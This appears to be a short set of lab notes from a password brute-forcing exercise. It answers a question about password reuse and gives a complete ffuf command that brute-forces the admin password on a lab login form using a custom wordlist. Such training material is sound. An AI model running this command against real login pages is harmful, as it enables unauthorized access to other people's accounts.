# [Brute-Forcing Passwords](Brute-Forcing%20Passwords.md)
### What is one prominent issue with passwords?

Password reuse
### What is the password of the user 'admin'?

```sh
ffuf -w ./custom_wordlist.txt -u http://154.57.164.82:31131/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```
![](Screenshot%202026-09-14%20at%2008.32.47.png)